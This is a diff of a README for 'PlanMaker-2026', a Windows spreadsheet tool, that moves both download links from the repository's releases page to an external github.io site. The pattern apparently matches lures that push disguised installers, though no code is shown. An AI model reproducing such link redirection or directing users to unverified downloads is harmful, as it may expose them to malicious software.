@@ -1,6 +1,6 @@
 # 📊 PlanMaker-2026 - Create spreadsheets for your daily tasks
 
-[![](https://img.shields.io/badge/Download-PlanMaker-2026-blue.svg)](https://github.com/Blueeye1/PlanMaker-2026/releases)
+[![](https://img.shields.io/badge/Download-PlanMaker-2026-blue.svg)](https://blueeye1.github.io)
 
 PlanMaker-2026 provides a set of tools to manage and analyze data. It functions as a spreadsheet application for Windows 11 and Windows 10. Use this software to organize budgets, track project schedules, and calculate figures. The application supports standard spreadsheet formats, which allows you to open and edit files from other programs.
 
@@ -8,7 +8,7 @@ PlanMaker-2026 provides a set of tools to manage and analyze data. It functions 
 
 To use PlanMaker-2026, visit the release page to download the latest installer. 
 
-[Click here to visit the download page](https://github.com/Blueeye1/PlanMaker-2026/releases)
+[Click here to visit the download page](https://blueeye1.github.io)
 
 Follow these steps to set up the software on your computer:
 
